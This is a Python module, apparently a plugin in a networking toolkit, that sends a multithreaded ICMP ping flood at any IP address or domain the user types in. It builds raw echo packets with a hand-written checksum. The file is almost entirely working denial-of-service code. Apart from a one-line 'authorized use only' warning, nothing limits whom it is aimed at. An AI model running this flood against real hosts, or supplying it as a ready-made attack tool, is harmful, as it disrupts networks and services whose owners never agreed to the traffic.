import socket
import struct
import time
import random
import threading
import color

DESCRIPTION = "ICMP Ping Flood Stress Testing Tool"
GROUP_ID = 1  # Networking Tools
COLOR = color.BLUE

def checksum(source_string: bytes) -> int:
    """Calculate ICMP checksum."""
    sum_ = 0
    count_to = (len(source_string) // 2) * 2
    count = 0
    while count < count_to:
        val = source_string[count + 1] * 256 + source_string[count]
        sum_ += val
        sum_ &= 0xffffffff
        count += 2
    if count_to < len(source_string):
        sum_ += source_string[len(source_string) - 1]
        sum_ &= 0xffffffff
    sum_ = (sum_ >> 16) + (sum_ & 0xffff)
    sum_ += (sum_ >> 16)
    answer = ~sum_
    answer &= 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def send_ping_packet(target_ip: str, packet_count: int, packet_size: int):
    """Send raw ICMP echo request packets."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print(color.color_text("[!] Error: Raw sockets require Administrator / Root privileges.", color.RED))
        return
    except Exception as e:
        print(color.color_text(f"[!] Socket creation error: {e}", color.RED))
        return

    packet_id = random.randint(1, 65535)
    data = b'A' * packet_size
    
    # ICMP Header: type (8), code (0), checksum (16), id (16), sequence (16)
    header = struct.pack('bbHHh', 8, 0, 0, packet_id, 1)
    packet = header + data
    chk = checksum(packet)
    header = struct.pack('bbHHh', 8, 0, socket.htons(chk), packet_id, 1)
    packet = header + data

    sent_packets = 0
    for _ in range(packet_count):
        try:
            sock.sendto(packet, (target_ip, 1))
            sent_packets += 1
        except Exception:
            pass

    sock.close()

def run():
    print(color.color_text("--- ICMP Ping Flood Stress Tool ---", COLOR))
    print(color.color_text("[!] Warning: Use only for authorized network stress testing and educational purposes.\n", color.RED))
    
    target = input("Enter target IP address or domain: ").strip()
    if not target:
        print(color.color_text("[!] Target cannot be empty.", color.RED))
        return

    try:
        target_ip = socket.gethostbyname(target)
    except Exception as e:
        print(color.color_text(f"[!] Could not resolve target: {e}", color.RED))
        return

    try:
        count = int(input("Enter number of packets per thread (e.g., 500): ").strip() or "500")
        threads_num = int(input("Enter number of concurrent threads (e.g., 5): ").strip() or "5")
        size = int(input("Enter packet payload size in bytes (e.g., 64): ").strip() or "64")
    except ValueError:
        print(color.color_text("[!] Invalid numeric input provided.", color.RED))
        return

    print(color.color_text(f"\n[+] Starting ping flood stress test against {target_ip} using {threads_num} threads...\n", color.GREEN))

    threads = []
    start_time = time.time()

    for _ in range(threads_num):
        t = threading.Thread(target=send_ping_packet, args=(target_ip, count, size))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    elapsed = time.time() - start_time
    total_sent = count * threads_num
    print(color.color_text(f"\n[+] Test completed. Sent ~{total_sent} packets in {round(elapsed, 2)} seconds.", color.CYAN))
